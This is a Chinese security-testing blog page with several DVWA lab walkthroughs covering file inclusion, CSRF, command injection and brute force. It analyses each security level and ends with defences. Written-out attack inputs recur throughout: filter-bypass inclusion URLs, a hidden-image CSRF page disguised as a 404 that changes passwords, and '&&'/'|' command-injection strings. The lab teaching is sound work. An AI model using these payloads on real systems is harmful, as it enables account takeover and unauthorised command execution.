<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">启动http 服务器</span></span><br><span class="line">D:\book\1&gt;python -m http.server 80</span><br><span class="line">Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) .</span><br></pre></td></tr></table></figure>

<p><img src="/aposts/d3b7fcf8/image-20220208155358733.png" alt="image-20220208155358733"></p>
<ul>
<li>直接把page改为远程的路径：<a target="_blank" rel="noopener" href="http://127.0.0.1/phpinfo.txt">http://127.0.0.1/phpinfo.txt</a></li>
</ul>
<p><img src="/aposts/d3b7fcf8/image-20220208155438310.png" alt="image-20220208155438310"></p>
<h2 id="安全等级为Medium"><a href="#安全等级为Medium" class="headerlink" title="安全等级为Medium"></a>安全等级为Medium</h2><h3 id="源码分析-1"><a href="#源码分析-1" class="headerlink" title="源码分析"></a>源码分析</h3><ul>
<li>将 “http:&#x2F;&#x2F;“ ,”https:&#x2F;&#x2F;“ ,”..&#x2F;“ ,”..&quot;“ 替换成空，我们直接双写绕过，如：像 http:&#x2F;&#x2F; 写成 htt<a target="_blank" rel="noopener" href="http://p//%EF%BC%8C">http://p://，</a></li>
</ul>
<p><img src="/aposts/d3b7fcf8/image-20220208160332055.png" alt="image-20220208160332055"></p>
<ul>
<li>具体的url如下：</li>
</ul>
<p><a target="_blank" rel="noopener" href="http://xxxx.xxx.xx/DVWA-2.0.1/vulnerabilities/fi/?page=htthttp://p://127.0.0.1/phpinfo.txt">http://XXXX.XXX.XX/DVWA-2.0.1/vulnerabilities/fi/?page=htthttp://p://127.0.0.1/phpinfo.txt</a></p>
<p><img src="/aposts/d3b7fcf8/image-20220208160810658.png" alt="image-20220208160810658"></p>
<h2 id="安全等级为High"><a href="#安全等级为High" class="headerlink" title="安全等级为High"></a>安全等级为High</h2><h3 id="源码分析-2"><a href="#源码分析-2" class="headerlink" title="源码分析"></a>源码分析</h3><p>如果page 中不包含 file 并且 file 不等于 include.php，则 输出 File not found !</p>
<p><img src="/aposts/d3b7fcf8/image-20220208161716844.png" alt="image-20220208161716844"></p>
<h3 id="开始攻击-1"><a href="#开始攻击-1" class="headerlink" title="开始攻击"></a>开始攻击</h3><p>通过file协议实现本地文件包含:具体的url如下：</p>
<p>http:&#x2F;XX.XX.XXX.xx&#x2F;DVWA-2.0.1&#x2F;vulnerabilities&#x2F;fi&#x2F;?page&#x3D;file:&#x2F;&#x2F;&#x2F;&#x2F;var&#x2F;www&#x2F;html&#x2F;phpinfo.txt</p>
<p><img src="/aposts/d3b7fcf8/image-20220208162158052.png" alt="image-20220208162158052"></p>
<h2 id="安全等级为impossible"><a href="#安全等级为impossible" class="headerlink" title="安全等级为impossible"></a>安全等级为impossible</h2><h3 id="源码分析-3"><a href="#源码分析-3" class="headerlink" title="源码分析"></a>源码分析</h3><p>impossible级别的代码使用了白名单机制进行防护，简单粗暴，page参数必须为“include.php”、“file1.php”、“file2.php”、“file3.php”之一，彻底杜绝了文件包含漏洞。</p>
<p><img src="/aposts/d3b7fcf8/image-20220208162426973.png" alt="image-20220208162426973"></p>
<p>本文主要来自<a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_45808483/article/details/121385412">这里</a></p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="https://louis-me.github.io/aposts/824ce28e/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="">
      <meta itemprop="description" content="一个正经的测试工程师">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="施坤的博客">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/aposts/824ce28e/" class="post-title-link" itemprop="url">DVWA通关指南-CSRF(跨站请求伪造)</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2022-02-07 15:03:01" itemprop="dateCreated datePublished" datetime="2022-02-07T15:03:01+08:00">2022-02-07</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2022-02-25 11:20:56" itemprop="dateModified" datetime="2022-02-25T11:20:56+08:00">2022-02-25</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95/" itemprop="url" rel="index"><span itemprop="name">安全测试</span></a>
                </span>
            </span>

          
            <span id="/aposts/824ce28e/" class="post-meta-item leancloud_visitors" data-flag-title="DVWA通关指南-CSRF(跨站请求伪造)" title="阅读次数">
              <span class="post-meta-item-icon">
                <i class="fa fa-eye"></i>
              </span>
              <span class="post-meta-item-text">阅读次数：</span>
              <span class="leancloud-visitors-count"></span>
            </span>
  
  <span class="post-meta-item">
    
      <span class="post-meta-item-icon">
        <i class="far fa-comment"></i>
      </span>
      <span class="post-meta-item-text">Valine：</span>
    
    <a title="valine" href="/aposts/824ce28e/#valine-comments" itemprop="discussionUrl">
      <span class="post-comments-count valine-comment-count" data-xid="/aposts/824ce28e/" itemprop="commentCount"></span>
    </a>
  </span>
  
  

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="说明"><a href="#说明" class="headerlink" title="说明"></a>说明</h2><ul>
<li>承接上文<a target="_blank" rel="noopener" href="https://moon-full.gitee.io/2022/01/29/DVWA%E9%80%9A%E5%85%B3%E6%8C%87%E5%8D%97-Command-Injection%EF%BC%88%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%EF%BC%89/">DVWA通关指南-Command-Injection（命令注入）</a>，本文对Cross Site Request Forgery (CSRF)（跨站请求伪造）进行实践</li>
<li>一般来说，攻击者通过伪造用户的浏览器的请求，向访问一个用户自己曾经认证访问过的网站发送出去，使目标网站接收并误以为是用户的真实操作而去执行命令</li>
<li>本次功能是对登录密码进行修改，修改后请用新密码登录DVWA</li>
</ul>
<h2 id="安全等级为LOW"><a href="#安全等级为LOW" class="headerlink" title="安全等级为LOW"></a>安全等级为LOW</h2><h3 id="源码分析"><a href="#源码分析" class="headerlink" title="源码分析"></a>源码分析</h3><p><img src="/aposts/824ce28e/image-20220207151219460.png" alt="image-20220207151219460"></p>
<p>抓包查看，直接就是get请求，没有任何防护，如token验证</p>
<p><img src="/aposts/824ce28e/image-20220207154001441.png" alt="image-20220207154001441"></p>
<h3 id="开始攻击"><a href="#开始攻击" class="headerlink" title="开始攻击"></a>开始攻击</h3><ul>
<li><p>抓包发现，修改密码的url其实就是一个get请求，链接如下：<a target="_blank" rel="noopener" href="http://ip/DVWA-2.0.1/vulnerabilities/csrf/?password_new=123456&amp;password_conf=123456&amp;Change=Change">http://ip/DVWA-2.0.1/vulnerabilities/csrf/?password_new=123456&amp;password_conf=123456&amp;Change=Change</a></p>
</li>
<li><p>只要诱骗用户点击这个恶意链接，就会将在不知情的情况下将密码改为123456</p>
</li>
</ul>
<p><strong>我们使用Burpsuite中的PoC检测CSRF</strong></p>
<ul>
<li>拦截到请求后，点击行动-相关工具-CSRF PoC生成</li>
</ul>
<p><img src="/aposts/824ce28e/image-20220207153930211.png" alt="image-20220207153930211"></p>
<ul>
<li>点击 在浏览器中测试</li>
</ul>
<p><img src="/aposts/824ce28e/image-20220207154417669.png" alt="image-20220207154417669"></p>
<ul>
<li>Burpsuite会自动创建一个站点,复制 URL</li>
</ul>
<p><img src="/aposts/824ce28e/image-20220207154442878.png" alt="image-20220207154442878"></p>
<ul>
<li>用复制的链接无法访问，改为如此就可以了<ul>
<li><a target="_blank" rel="noopener" href="http://127.0.0.1:8080/show/9/4w8z4wwlz1uk23ho7hliosh2gaxw584b">http://127.0.0.1:8080/show/9/4w8z4wwlz1uk23ho7hliosh2gaxw584b</a></li>
</ul>
</li>
<li>点击提交按钮</li>
</ul>
<p><img src="/aposts/824ce28e/image-20220207160513370.png" alt="image-20220207160513370"></p>
<ul>
<li>提交后，自动跳转url其实是修改密码的url，查看到提示密码修改成功，用新密码123456登录成功</li>
</ul>
<p><img src="/aposts/824ce28e/image-20220207160636051.png"></p>
<p><img src="/aposts/824ce28e/image-20220207160801912.png" alt="image-20220207160801912"></p>
<p><strong>我们可以伪装恶意代码</strong></p>
<ul>
<li>我们将构造的恶意链接伪装，放入index.html中</li>
<li>打开我的服务器中的httpd中的dvwa目录下，新建index.html</li>
</ul>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[root@VM-24-13-centos DVWA-2.0.1]# pwd</span><br><span class="line">/var/www/html/DVWA-2.0.1</span><br><span class="line">[root@VM-24-13-centos DVWA-2.0.1]# vi index.html</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;img src=&quot;http://xxx.xxx.xxx.xx/DVWA-2.0.1/vulnerabilities/csrf/?password_new=1234567&amp;password_conf=1234567&amp;Change=Change#&quot; border=&quot;0&quot; style=&quot;display:none;&quot;/&gt;</span><br><span class="line">&lt;h1&gt;404&lt;h1&gt; </span><br><span class="line">&lt;h2&gt;resource not found.&lt;h2&gt;</span><br></pre></td></tr></table></figure>

<ul>
<li>重启服务器</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[root@VM-24-13-centos DVWA-2.0.1]# service httpd restart</span><br><span class="line">Redirecting to /bin/systemctl restart httpd.service</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li>访问刚刚编辑的index.html，查看请求发现发起 了修改密码</li>
</ul>
<p><img src="/aposts/824ce28e/image-20220207170837412.png" alt="image-20220207170837412"></p>
<h2 id="安全等级为：medium"><a href="#安全等级为：medium" class="headerlink" title="安全等级为：medium"></a>安全等级为：medium</h2><h3 id="分析源码"><a href="#分析源码" class="headerlink" title="分析源码"></a>分析源码</h3><p>Medium级别的代码检查了保留变量 HTTP_REFERER（http包头的Referer参数的值，表示来源地址）中是否包含SERVER_NAME（http包头的Host参数，及要访问的主机名），希望通过这种机制抵御CSRF攻击。</p>
<p><img src="/aposts/824ce28e/image-20220207171945510.png" alt="image-20220207171945510"></p>
<p>使用安全等级为Low访问index.html的方式时，发送修改密码的请求，一直加载中最后响应302后，自动发送登录请求</p>
<p><img src="/aposts/824ce28e/image-20220207172258697.png" alt="image-20220207172258697"></p>
<h3 id="开始攻击-1"><a href="#开始攻击-1" class="headerlink" title="开始攻击"></a>开始攻击</h3><ul>
<li>漏洞利用过滤规则是http包头的Referer参数的值中必须包含主机名（这里是我服务器的ip）我们可以将攻击页面命名为XX.XX.XX.XX.php（XX是服务器的host，页面被放置在攻击者的服务器里）就可以绕过了</li>
<li>准备php文件，把密码修改成12345678</li>
</ul>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">[root@VM-24-13-centos DVWA-2.0.1]# pwd</span><br><span class="line">/var/www/html/DVWA-2.0.1</span><br><span class="line"></span><br><span class="line">[root@VM-24-13-centos DVWA-2.0.1]# vi XX.XX.XX.XX.php</span><br><span class="line"> </span><br><span class="line">&lt;img src=&quot;http://XX.XX.XX.XX/DVWA-2.0.1/vulnerabilities/csrf/?password_new=12345678&amp;password_conf=12345678&amp;Change=Change#&quot; border=&quot;0&quot; style=&quot;display:none;&quot;/&gt;</span><br><span class="line">&lt;h1&gt;404&lt;h1&gt; </span><br><span class="line">&lt;h2&gt;resource not found.&lt;h2&gt;</span><br><span class="line"></span><br><span class="line">[root@VM-24-13-centos DVWA-2.0.1]# systemctl restart httpd</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li>访问刚刚新增的host.php文件，发现修改密码修改成功了(用12345678登录成功)，请求头部加入了Referer</li>
</ul>
<p><img src="/aposts/824ce28e/image-20220207174637976.png" alt="image-20220207174637976"></p>
<h2 id="安全等级为Hight"><a href="#安全等级为Hight" class="headerlink" title="安全等级为Hight"></a>安全等级为Hight</h2><p>修改密码查看请求看下区别</p>
<p><img src="/aposts/824ce28e/image-20220208090610360.png" alt="image-20220208090610360"></p>
<h3 id="源码分析-1"><a href="#源码分析-1" class="headerlink" title="源码分析"></a>源码分析</h3><p>High级别的代码加入了Anti-CSRF token机制，用户每次访问改密页面时，服务器会返回一个随机的token，向服务器发起请求时，需要提交token参数，而服务器在收到请求时，会优先检查token，只有token正确，才会处理客户端的请求。</p>
<p><img src="/aposts/824ce28e/image-20220208090125335.png" alt="image-20220208090125335"></p>
<h3 id="开始攻击-2"><a href="#开始攻击-2" class="headerlink" title="开始攻击"></a>开始攻击</h3><p>客户端访问攻击页面-&gt;攻击页面获取修改密码页面的token-&gt;将token和密码作为参数一起提交，攻击页面获取修改密码页面的token这一步属于跨域请求，浏览器已经禁止这么做了，所以想要完整这个操作，有两个思路：</p>
<ul>
<li>第一， 将该js上传到服务器的目录下，这样就是同一个域了，不过如果可以这样，为啥不放木马呢？</li>
<li>第二， 利用xss，xss可以执行代码，获取token，xss更现实一点，但是也得需要该网站存在xss，所以单纯从这个修改密码页面，无法突破High漏洞，本此不坐实际，等到时候学到xss时，反过来再做实际</li>
</ul>
<h2 id="安全等级为impossible"><a href="#安全等级为impossible" class="headerlink" title="安全等级为impossible"></a>安全等级为impossible</h2><p>这里让输入原密码，不清楚原密码的情况下，就无法进行CSRF攻击。</p>
<p>结合业务设计，修改密码必须提供原密码，保障安全。</p>
<p><img src="/aposts/824ce28e/image-20220208091727056.png" alt="image-20220208091727056"></p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="https://louis-me.github.io/aposts/162a21c6/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="">
      <meta itemprop="description" content="一个正经的测试工程师">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="施坤的博客">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/aposts/162a21c6/" class="post-title-link" itemprop="url">DVWA通关指南-Command Injection（命令注入）</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2022-01-29 09:13:44" itemprop="dateCreated datePublished" datetime="2022-01-29T09:13:44+08:00">2022-01-29</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2022-02-25 11:20:56" itemprop="dateModified" datetime="2022-02-25T11:20:56+08:00">2022-02-25</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95/" itemprop="url" rel="index"><span itemprop="name">安全测试</span></a>
                </span>
            </span>

          
            <span id="/aposts/162a21c6/" class="post-meta-item leancloud_visitors" data-flag-title="DVWA通关指南-Command Injection（命令注入）" title="阅读次数">
              <span class="post-meta-item-icon">
                <i class="fa fa-eye"></i>
              </span>
              <span class="post-meta-item-text">阅读次数：</span>
              <span class="leancloud-visitors-count"></span>
            </span>
  
  <span class="post-meta-item">
    
      <span class="post-meta-item-icon">
        <i class="far fa-comment"></i>
      </span>
      <span class="post-meta-item-text">Valine：</span>
    
    <a title="valine" href="/aposts/162a21c6/#valine-comments" itemprop="discussionUrl">
      <span class="post-comments-count valine-comment-count" data-xid="/aposts/162a21c6/" itemprop="commentCount"></span>
    </a>
  </span>
  
  

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="说明"><a href="#说明" class="headerlink" title="说明"></a>说明</h2><ul>
<li>承接上文<a target="_blank" rel="noopener" href="https://moon-full.gitee.io/2022/01/27/DVWA%E9%80%9A%E5%85%B3%E6%8C%87%E5%8D%97-Brute%20Force(%E7%88%86%E7%A0%B4)/">DVWA通关指南-Brute Force(爆破)</a>，本文对Command Injection（命令注入）进行实践</li>
<li>命令注入攻击的目的是，在易受攻击的应用程序中注入和执行攻击者指定的命令。在这种情况下，执行不需要的系统命令的应用程序就像一个伪系统外壳，攻击者可以将其作为任何授权的系统用户使用。但是，执行命令的权限和环境与 web 服务相同。</li>
<li>在大多数情况下，由于缺少正确的输入数据验证，攻击者对例如表单、cookies、HTTP标头等进行操控，使得命令注入攻击成为可能。此攻击也称为“远程命令执行 (RCE)”。</li>
<li>通过 RCE 远程查找操作系统上 web 服务的用户以及机器主机名。</li>
</ul>
<h2 id="安全等级为LOW"><a href="#安全等级为LOW" class="headerlink" title="安全等级为LOW"></a>安全等级为LOW</h2><ul>
<li><p>在该等级下允许直接输入指令给一些 PHP 函数，从而使这些指令将在操作系统上执行。在输入其他的一些的指令时，有可能发生不符合设计意图的命令被执行。</p>
</li>
<li><p>这可以通过在请求中添加“一旦命令成功执行，运行此命令”的其他指令来完成。</p>
</li>
</ul>
<h3 id="源码分析"><a href="#源码分析" class="headerlink" title="源码分析"></a>源码分析</h3><p>传入的 ping 命令的参数 target，并没有进行任何过滤。</p>
<p><img src="/aposts/162a21c6/image-20220129092654893.png" alt="image-20220129092654893"></p>
<h3 id="攻击方式"><a href="#攻击方式" class="headerlink" title="攻击方式"></a>攻击方式</h3><ul>
<li>由于在操作系统中，“&amp;”、“&amp;&amp;”、“|”、“||”都可以作为命令连接符使用，由于网页没有对参数进行任何过滤，因此可以用连接符后面接上其他指令来执行</li>
<li>输入: <code>127.0.0.1 &amp;&amp; ls</code></li>
</ul>
<p><img src="/aposts/162a21c6/image-20220129092930315.png" alt="image-20220129092930315"></p>
<h2 id="安全等级为Medium"><a href="#安全等级为Medium" class="headerlink" title="安全等级为Medium"></a>安全等级为Medium</h2><p>开发人员已经知晓有关命令注入的一些问题，并使用了各种方式来过滤输入。然而这还不够，攻击者仍然可以使用各种其他系统语法来执行所需的命令。</p>
<h3 id="源码审计"><a href="#源码审计" class="headerlink" title="源码审计"></a>源码审计</h3><p>源码如下，medium 级别的代码加入了对“&amp;&amp;”和“;”的过滤，替换成空格</p>
<p><img src="/aposts/162a21c6/image-20220129095247031.png" alt="image-20220129095247031"></p>
<h3 id="攻击方式-1"><a href="#攻击方式-1" class="headerlink" title="攻击方式"></a>攻击方式</h3><ul>
<li><p>输入<code>127.0.0.1&amp;ls /usr/</code></p>
</li>
<li><p>“&amp;&amp;” 连接符不能用了，那我们就用 “&amp;” 连接符来替代就行了。这里需要注意的是”&amp;&amp;”与” &amp;”的区别：</p>
</li>
<li><p><strong>Command 1&amp;&amp;Command 2</strong></p>
<ul>
<li>先执行Command 1，执行成功后执行Command 2，否则不执行Command 2</li>
</ul>
</li>
<li><p><strong>Command 1&amp;Command 2</strong></p>
<ul>
<li>先执行Command 1，不管是否成功，都会执行Command 2</li>
</ul>
</li>
</ul>
<p><img src="/aposts/162a21c6/image-20220129095529294.png" alt="image-20220129095529294"></p>
<h2 id="安全等级为High"><a href="#安全等级为High" class="headerlink" title="安全等级为High"></a>安全等级为High</h2><h3 id="源码审计-1"><a href="#源码审计-1" class="headerlink" title="源码审计"></a>源码审计</h3><p>相比 Medium 级别的代码，High 级别的代码进一步完善了过滤的黑名单。</p>
<p><img src="/aposts/162a21c6/image-20220129104751233.png" alt="image-20220129104751233"></p>
<h3 id="攻击方式-2"><a href="#攻击方式-2" class="headerlink" title="攻击方式"></a>攻击方式</h3><p>输入：<code>127.0.0.1|ls /usr/</code></p>
<p><img src="/aposts/162a21c6/image-20220129104936769.png" alt="image-20220129104936769"></p>
<h2 id="安全等级为impossible"><a href="#安全等级为impossible" class="headerlink" title="安全等级为impossible"></a>安全等级为impossible</h2><h3 id="源代码分析"><a href="#源代码分析" class="headerlink" title="源代码分析"></a>源代码分析</h3><p>mpossible级别的代码加入了Anti-CSRF token，同时对参数ip进行了严格的限制，只有诸如“数字.数字.数字.数字”的输入才会被接收执行，因此不存在命令注入漏洞。 </p>
<ul>
<li>代码中使用<code>stripslashes() </code>函数 删除反斜杠，该函数可用于清理从数据库中或者从 HTML 表单中取回的数据。</li>
<li><code>explode()</code> 函数 使用一个字符串分割另一个字符串，并返回由字符串组成的数组</li>
<li><code>is_numeric(string)</code>: 该检测string是否为数字或数字字符串</li>
</ul>
<p><img src="/aposts/162a21c6/image-20220129105616718.png" alt="image-20220129105616718"></p>
<h2 id="总结与防御"><a href="#总结与防御" class="headerlink" title="总结与防御"></a>总结与防御</h2><p>在一些 Web 程序中需要调用一些执行系统命令的函数，例如 PHP 的 system、exec、shell_exec 函数等。当攻击者能够直接操作命令执行的参数，并且没有代码对传入的参数进行过滤时，攻击者就能将用于搞破坏的系统命令夹带进来让系统执行。<br>在 Windows 系统和 Linux 系统中都有一些管道符，这些管道符可以被用来拼接攻击指令：</p>
<ul>
<li>“&amp;&amp;”：前面的语句正确执行时，才执行后面的语句；</li>
<li>“&amp;”：前面的语句执行出错时，执行后面的语句；</li>
<li>“|”：将前面的语句运行的结果，当做后面语句的输入，显示后面语句的执行结果；</li>
<li>“||”：前面的语句出错时，执行后面的语句。</li>
</ul>
<p>对于指令注入漏洞，比较好的防御方式是尽可能别用命令执行函数，对于输入的参数要做好黑名单过滤或者白名单验证</p>
<ul>
<li>本文主要来自<a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_45808483/article/details/121385412">DVWA通关详解</a></li>
</ul>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="https://louis-me.github.io/aposts/b7636e10/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="">
      <meta itemprop="description" content="一个正经的测试工程师">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="施坤的博客">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/aposts/b7636e10/" class="post-title-link" itemprop="url">DVWA通关指南-Brute Force(爆破)</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2022-01-27 10:15:30" itemprop="dateCreated datePublished" datetime="2022-01-27T10:15:30+08:00">2022-01-27</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2022-02-25 11:20:56" itemprop="dateModified" datetime="2022-02-25T11:20:56+08:00">2022-02-25</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95/" itemprop="url" rel="index"><span itemprop="name">安全测试</span></a>
                </span>
            </span>

          
            <span id="/aposts/b7636e10/" class="post-meta-item leancloud_visitors" data-flag-title="DVWA通关指南-Brute Force(爆破)" title="阅读次数">
              <span class="post-meta-item-icon">
                <i class="fa fa-eye"></i>
              </span>
              <span class="post-meta-item-text">阅读次数：</span>
              <span class="leancloud-visitors-count"></span>
            </span>
  
  <span class="post-meta-item">
    
      <span class="post-meta-item-icon">
        <i class="far fa-comment"></i>
      </span>
      <span class="post-meta-item-text">Valine：</span>
    
    <a title="valine" href="/aposts/b7636e10/#valine-comments" itemprop="discussionUrl">
      <span class="post-comments-count valine-comment-count" data-xid="/aposts/b7636e10/" itemprop="commentCount"></span>
    </a>
  </span>
  
  

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="说明"><a href="#说明" class="headerlink" title="说明"></a>说明</h2><ul>
<li><p><a target="_blank" rel="noopener" href="https://moon-full.gitee.io/2022/01/25/%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95-%E6%BC%8F%E6%B4%9E%E7%8E%AF%E5%A2%83DVWA%E7%9A%84%E6%90%AD%E5%BB%BA/">上文</a>服务器已经搭建好了DVWA环境，本篇开始介绍对DVWA的使用</p>
</li>
<li><p>Bruce Force(爆破)。密码破解是从计算机系统中存储或传输的数据中还原出密码的过程，一种常见的方法是反复尝试猜测密码，直到把正确的密码试出来。用户往往会设置弱密码，不安全选择的例子包括字典中的单字、姓氏、任何太短的密码（通常被认为少于6或7个字符）或可预测的模式（例如，交替的元音和辅音，称为 leetspeak，因此 “password” 变成了 p@55w0rd”)。</p>
<p><img src="/aposts/b7636e10/image-20220127145156521.png" alt="image-20220127145156521"></p>
</li>
</ul>
<h2 id="安全等级LOW"><a href="#安全等级LOW" class="headerlink" title="安全等级LOW"></a>安全等级LOW</h2><p>把安全等级调整为：LOW。开发人员完全忽视了任何保护方法，允许任何人尝试多次任意访问，可以在没有任何影响的情况下对任意用户进行登录。</p>
<p><img src="/aposts/b7636e10/image-20220127145338823.png" alt="image-20220127145338823"></p>
<h3 id="源代码审计"><a href="#源代码审计" class="headerlink" title="源代码审计"></a>源代码审计</h3><ul>
<li>点击查看源码</li>
</ul>
<p><img src="/aposts/b7636e10/image-20220127145613479.png" alt="image-20220127145613479"></p>
<ul>
<li>分析。源码如下，代码将获取用户输入的用户名和密码并将其进行 md5 加密，然后使用 SQL SELECT 语句进行查询。由于进行了 md5 加密，因此直接阻止了 SQL 注入，因为经过 md5 这种摘要算法之后 SQL 语句就会被破坏(不过这里用 SQL 注入可以登陆成功)。注意到此时服务器只是使用了 isset() 函数验证了参数 Login 是否被设置，参数 username、password 没有做任何过滤，更重要的是没有任何的防爆破机制。</li>
</ul>
<p><img src="/aposts/b7636e10/image-20220127145759588.png" alt="image-20220127145759588"></p>
<h3 id="攻击方式"><a href="#攻击方式" class="headerlink" title="攻击方式"></a>攻击方式</h3><h4 id="工具准备"><a href="#工具准备" class="headerlink" title="工具准备"></a>工具准备</h4><ul>
<li><p>Burp Suite Pro 2020.4_v2.5.0.2（有需要，可以联系我）</p>
<ul>
<li>依赖java9，可以从这里<a target="_blank" rel="noopener" href="https://www.oracle.com/java/technologies/javase/javase9-archive-downloads.html">下载安装</a>，设置好环境变量</li>
</ul>
</li>
<li><p>设置Burp 代理</p>
</li>
</ul>
<p><img src="/aposts/b7636e10/image-20220127151952103.png" alt="image-20220127151952103"></p>
<ul>
<li>chrome浏览器设置代理</li>
</ul>
<p><img src="/aposts/b7636e10/image-20220127152139068.png" alt="image-20220127152139068"></p>
<h4 id="开始测试"><a href="#开始测试" class="headerlink" title="开始测试"></a>开始测试</h4><p>在Brute Force中，用户名输入admin，密码输入1123（错误的密码），正确的密码是password，点击登录被Burp 拦截</p>
<p><img src="/aposts/b7636e10/image-20220127152224491.png" alt="image-20220127152224491"></p>
<p><img src="/aposts/b7636e10/image-20220127152346413.png" alt="image-20220127152346413"></p>
<p>把拦截的请求发送到测试器</p>
<p><img src="/aposts/b7636e10/image-20220127152650009.png" alt="image-20220127152650009"></p>
<p>在测试器点击清楚</p>
<p><img src="/aposts/b7636e10/image-20220127153846031.png" alt="image-20220127153846031"></p>
<p>选择密码，点击添加</p>
<p><img src="/aposts/b7636e10/image-20220127153928769.png" alt="image-20220127153928769"></p>
<p>点击Palyloads，载入自定义的密码字典</p>
<p><img src="/aposts/b7636e10/image-20220127155906579.png" alt="image-20220127155906579"></p>
<p>设置下线程数，开始攻击</p>
<p><img src="/aposts/b7636e10/image-20220127163807548.png" alt="image-20220127163807548"></p>
<p>查看测试结果，有一个长度不一样的，点进去看下</p>
<p><img src="/aposts/b7636e10/image-20220127163854226.png" alt="image-20220127163854226"></p>
<p>登录成功了</p>
<p><img src="/aposts/b7636e10/image-20220127163956037.png" alt="image-20220127163956037"></p>
<h2 id="安全等级Medium"><a href="#安全等级Medium" class="headerlink" title="安全等级Medium"></a>安全等级Medium</h2><p>此阶段在验证失败的登录屏幕上添加睡眠，这意味着当您登录不正确时，在页面可见之前将有额外的两秒钟等待。这只会减慢一分钟内可处理的请求量，使暴力攻击的时间更长。</p>
